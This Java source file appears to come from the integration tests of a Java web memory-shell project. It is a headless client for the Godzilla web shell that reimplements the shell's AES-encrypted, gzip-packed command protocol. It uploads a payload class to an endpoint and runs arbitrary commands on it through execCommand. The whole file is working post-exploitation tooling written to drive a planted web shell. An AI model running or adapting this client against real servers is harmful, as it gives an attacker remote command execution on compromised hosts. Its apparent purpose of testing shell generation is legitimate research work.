package com.reajason.javaweb.blade.integration;

import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * Minimal Godzilla HTTP client. The official io.github.beichendream:godzilla artifact is the
 * desktop GUI, not a headless client, so the test speaks the wire protocol directly.
 */
final class GodzillaClient implements AutoCloseable {

    private final OkHttpClient http = new OkHttpClient();
    private final String entrypoint;
    private final String pass;
    private final String key;
    private final String md5;
    private final Map<String, String> headers = new LinkedHashMap<>();

    GodzillaClient(String entrypoint, String pass, String userKey, String headerName, String headerValue) {
        this.entrypoint = entrypoint;
        this.pass = pass;
        this.key = md5Hex(userKey).substring(0, 16);
        this.md5 = md5Hex(pass + this.key).toUpperCase();
        headers.put(headerName, headerValue);
        headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers.put("Referer", entrypoint);
    }

    void start() throws IOException {
        post(payloadBytes());
    }

    boolean test() throws IOException {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("methodName", "test");
        return "ok".equals(post(methodCall(params)));
    }

    String execCommand(String command) throws IOException {
        Map<String, String> params = new LinkedHashMap<>();
        params.put("methodName", "execCommand");
        params.put("argsCount", "1");
        params.put("arg-0", command);
        return post(methodCall(params));
    }

    private String post(byte[] plain) throws IOException {
        String payload = Base64.getEncoder().encodeToString(aes(plain, true));
        RequestBody body = new FormBody.Builder().add(pass, payload).build();
        Request request = new Request.Builder()
                .url(entrypoint)
                .post(body)
                .headers(Headers.of(headers))
                .build();
        try (Response response = http.newCall(request).execute()) {
            ResponseBody responseBody = response.body();
            return decode(responseBody == null ? "" : responseBody.string());
        }
    }

    private String decode(String response) {
        if (response.length() < 32) {
            return response;
        }
        String prefix = md5.substring(0, 16);
        String suffix = md5.substring(16);
        int start = response.indexOf(prefix);
        if (start < 0) {
            return response;
        }
        int end = response.indexOf(suffix, start + prefix.length());
        if (end < 0) {
            return response;
        }
        try {
            byte[] encrypted = Base64.getDecoder().decode(response.substring(start + prefix.length(), end));
            try (GZIPInputStream gzip = new GZIPInputStream(
                    new ByteArrayInputStream(aes(encrypted, false)))) {
                return readAll(gzip);
            }
        } catch (IllegalArgumentException | IOException e) {
            return response;
        }
    }

    private byte[] methodCall(Map<String, String> params) throws IOException {
        ByteArrayOutputStream plain = new ByteArrayOutputStream();
        GZIPOutputStream gzip = new GZIPOutputStream(plain);
        for (Map.Entry<String, String> entry : params.entrySet()) {
            byte[] name = entry.getKey().getBytes(StandardCharsets.UTF_8);
            byte[] value = entry.getValue().getBytes(StandardCharsets.UTF_8);
            gzip.write(name);
            gzip.write(2);
            gzip.write(intToBytes(value.length));
            gzip.write(value);
        }
        gzip.close();
        return plain.toByteArray();
    }

    private static byte[] payloadBytes() throws IOException {
        String name = GodzillaPayload.class.getName().replace('.', '/') + ".class";
        try (InputStream in = GodzillaPayload.class.getClassLoader().getResourceAsStream(name)) {
            if (in == null) {
                throw new IOException("Godzilla payload class resource is missing: " + name);
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            return out.toByteArray();
        }
    }

    private byte[] aes(byte[] bytes, boolean encrypt) throws IOException {
        try {
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(encrypt ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE,
                    new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES"));
            return cipher.doFinal(bytes);
        } catch (Exception e) {
            throw new IOException("AES failed", e);
        }
    }

    private static byte[] intToBytes(int value) {
        return new byte[]{
                (byte) (value & 255),
                (byte) ((value >> 8) & 255),
                (byte) ((value >> 16) & 255),
                (byte) ((value >> 24) & 255)};
    }

    private static String readAll(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int read;
        while ((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
        return new String(out.toByteArray(), StandardCharsets.UTF_8);
    }

    private static String md5Hex(String value) {
        try {
            byte[] digest = MessageDigest.getInstance("MD5").digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder hex = new StringBuilder(digest.length * 2);
            for (byte b : digest) {
                hex.append(Character.forDigit((b >> 4) & 0xf, 16));
                hex.append(Character.forDigit(b & 0xf, 16));
            }
            return hex.toString();
        } catch (Exception e) {
            throw new IllegalStateException("MD5 is unavailable", e);
        }
    }

    @Override
    public void close() {
    }
}
